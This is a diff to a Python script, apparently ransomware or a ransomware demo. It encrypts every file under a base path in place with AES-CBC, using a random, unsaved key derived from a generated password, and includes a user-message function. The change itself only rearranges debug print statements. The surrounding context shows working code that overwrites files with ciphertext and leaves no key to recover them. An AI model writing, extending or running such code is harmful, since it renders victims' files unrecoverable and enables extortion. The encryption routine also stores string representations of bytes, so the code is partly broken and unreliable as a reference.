@@ -31,7 +31,6 @@ def Encrypt(fileToEncrypt, iv, aes_obj):
             elif len(chunk) % 16 != 0:
                 chunk += b' ' * (16 - (len(chunk) % 16))
             encrypted = encrypted + str(aes_obj.encrypt(chunk))
-    print("encrypted size: " + str(len(encrypted)))
     return encrypted
 
 def EncryptFile(fileToEncrypt, key):
@@ -42,6 +41,7 @@ def EncryptFile(fileToEncrypt, key):
     aes_obj = AES.new(key, AES.MODE_CBC, iv)
     encrypted_content = Encrypt(fileToEncrypt, iv, aes_obj)
     with open(fileToEncrypt, 'wb') as outfile:
+        print("encrypted size: " + str(len(encrypted_content)))
         outfile.write(encrypted_content.encode())
 
 def EncryptAllFiles(filesToEncrypt, key):
@@ -71,8 +71,7 @@ def WriteUserMessage():
 
 def StartEncryption():
     files_to_encrypt = GetAllFiles(base_path)
-    print("files to encrypt")
-    print(len(files_to_encrypt))
+    print("files to encrypt: " + str(len(files_to_encrypt)))
     password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))
     key = SHA256.new(password.encode('utf-8')).digest()
     EncryptAllFiles(files_to_encrypt, key)
